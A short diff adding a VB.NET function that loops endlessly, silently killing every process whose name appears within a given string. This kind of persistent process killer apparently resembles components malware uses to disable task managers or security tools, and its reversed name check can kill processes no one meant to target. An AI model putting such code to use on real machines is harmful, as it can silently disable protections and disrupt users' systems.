@@ -1,0 +1,15 @@
+Public Shared Function Killer(ByVal proc As String) As String
+        Try
+            While True
+                Dim p As System.Diagnostics.Process
+                For Each p In System.Diagnostics.Process.GetProcesses
+                    If proc.Contains(p.ProcessName) Then
+                        p.Kill()
+                    End If
+                Next
+                System.Threading.Thread.Sleep(1)
+            End While
+        Catch ex As Exception
+        End Try
+        Return Nothing
+    End Function
